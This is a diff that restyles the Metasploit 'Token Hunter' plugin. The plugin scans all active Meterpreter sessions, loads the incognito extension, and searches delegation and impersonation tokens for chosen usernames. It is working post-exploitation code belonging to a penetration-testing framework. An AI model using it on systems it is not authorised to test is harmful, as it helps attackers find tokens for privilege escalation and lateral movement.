@@ -4,96 +4,94 @@
 #
 
 module Msf
+  class Plugin::TokenHunter < Msf::Plugin
 
-class Plugin::TokenHunter < Msf::Plugin
+    class TokenCommandDispatcher
+      include Msf::Ui::Console::CommandDispatcher
 
-  class TokenCommandDispatcher
-    include Msf::Ui::Console::CommandDispatcher
-
-    def name
-      "Token Hunter"
-    end
-
-    def commands
-      {
-        'token_hunt_user'        => "Scan all connected meterpreter sessions for active tokens corresponding to one or more users"
-      }
-    end
-
-    def cmd_token_hunt_user(*args)
-
-      opts = Rex::Parser::Arguments.new(
-        "-h"   => [ false,  "This help menu"],
-        "-f"   => [ true,   "A file containing a list of users to search for (one per line)"]
-      )
-
-      opt_userfile  = nil
-      opt_users     = []
-
-      opts.parse(args) do |opt, idx, val|
-        case opt
-        when "-h"
-          print_line("Usage: token_hunt_user [options] <username> [username] .. [username]")
-          print_line(opts.usage)
-          return
-        when "-f"
-          opt_userfile = val
-        else
-          opt_users << val
-        end
+      def name
+        'Token Hunter'
       end
 
-      if(opt_userfile)
-        ::File.open(opt_userfile, "rb") do |fd|
-          fd.each_line do |line|
-            line.strip!
-            next if line.empty?
-            next if line =~ /^#/
-            opt_users << line
+      def commands
+        {
+          'token_hunt_user' => 'Scan all connected Meterpreter sessions for active tokens corresponding to one or more users'
+        }
+      end
+
+      def cmd_token_hunt_user(*args)
+        opts = Rex::Parser::Arguments.new(
+          '-h' => [ false, 'This help menu'],
+          '-f' => [ true, 'A file containing a list of users to search for (one per line)']
+        )
+
+        opt_userfile = nil
+        opt_users = []
+
+        opts.parse(args) do |opt, _idx, val|
+          case opt
+          when '-h'
+            print_line('Usage: token_hunt_user [options] <username> [username] .. [username]')
+            print_line(opts.usage)
+            return
+          when '-f'
+            opt_userfile = val
+          else
+            opt_users << val
           end
         end
-      end
 
-      opt_users.uniq!
+        if opt_userfile
+          ::File.open(opt_userfile, 'rb') do |fd|
+            fd.each_line do |line|
+              line.strip!
+              next if line.empty?
+              next if line =~ /^#/
 
-      tokens_del = {}
-      tokens_imp = {}
-
-      framework.sessions.each_key do |sid|
-        session = framework.sessions[sid]
-        next if session.type != "meterpreter"
-
-        print_status(">> Scanning session #{session.sid} / #{session.session_host}")
-
-        if(! session.incognito)
-          session.core.use("incognito")
+              opt_users << line
+            end
+          end
         end
 
-        if(! session.incognito)
-          print_status("!! Failed to load incognito on #{session.sid} / #{session.session_host}")
-          next
-        end
+        opt_users.uniq!
 
-        res = session.incognito.incognito_list_tokens(0)
-        if(res)
-          res["delegation"].split("\n").each do |user|
+        tokens_del = {}
+        tokens_imp = {}
 
+        framework.sessions.each_key do |sid|
+          session = framework.sessions[sid]
+          next if session.type != 'meterpreter'
+
+          print_status(">> Scanning session #{session.sid} / #{session.session_host}")
+
+          if !session.incognito
+            session.core.use('incognito')
+          end
+
+          if !session.incognito
+            print_status("!! Failed to load incognito on #{session.sid} / #{session.session_host}")
+            next
+          end
+
+          res = session.incognito.incognito_list_tokens(0)
+          next unless res
+
+          res['delegation'].split("\n").each do |user|
             opt_users.each do |needle|
-
-              ndom,nusr = needle.split("\\")
-              if(not nusr)
+              ndom, nusr = needle.split('\\')
+              if !nusr
                 nusr = ndom
                 ndom = nil
               end
 
-              if(not user.nil? and ndom and user.strip.downcase == needle.strip.downcase)
+              if (!user.nil? && ndom && (user.strip.downcase == needle.strip.downcase))
                 print_status("FOUND: #{session.sid} - #{session.session_host} - #{user} (delegation)")
                 next
               end
 
-              fdom,fusr = user.split("\\")
+              _fdom, fusr = user.split('\\')
 
-              if (not fusr.nil? and ! ndom and fusr.strip.downcase == nusr.strip.downcase)
+              if (!fusr.nil? && !ndom && (fusr.strip.downcase == nusr.strip.downcase))
                 print_status("FOUND: #{session.sid} - #{session.session_host} - #{user} (delegation)")
               end
             end
@@ -102,23 +100,21 @@ class Plugin::TokenHunter < Msf::Plugin
             tokens_del[user] << session.sid
           end
 
-
-          res["impersonation"].split("\n").each do |user|
-
+          res['impersonation'].split("\n").each do |user|
             opt_users.each do |needle|
-              ndom,nusr = needle.split("\\")
-              if(not nusr)
+              ndom, nusr = needle.split('\\')
+              if !nusr
                 nusr = ndom
                 ndom = nil
               end
 
-              if(not user.nil? and ndom and user.strip.downcase == needle.strip.downcase)
+              if (!user.nil? && ndom && (user.strip.downcase == needle.strip.downcase))
                 print_status(">> Found #{session.sid} - #{session.session_host} - #{user} (impersonation)")
                 next
               end
 
-              fdom,fusr = user.split("\\")
-              if (not fusr.nil? and ! ndom and fusr.strip.downcase == nusr.strip.downcase)
+              _fdom, fusr = user.split('\\')
+              if (!fusr.nil? && !ndom && (fusr.strip.downcase == nusr.strip.downcase))
                 print_status(">> Found #{session.sid} - #{session.session_host} - #{user} (impersonation)")
               end
             end
@@ -129,25 +125,22 @@ class Plugin::TokenHunter < Msf::Plugin
         end
       end
     end
-  end
 
+    def initialize(framework, opts)
+      super
+      add_console_dispatcher(TokenCommandDispatcher)
+    end
 
-  def initialize(framework, opts)
-    super
-    add_console_dispatcher(TokenCommandDispatcher)
-  end
+    def cleanup
+      remove_console_dispatcher('Token Hunter')
+    end
 
-  def cleanup
-    remove_console_dispatcher('Token Hunter')
-  end
+    def name
+      'token_hunter'
+    end
 
-  def name
-    "token_hunter"
-  end
-
-  def desc
-    "Search all active meterpreter sessions for specific tokens"
+    def desc
+      'Search all active Meterpreter sessions for specific tokens'
+    end
   end
 end
-end
-
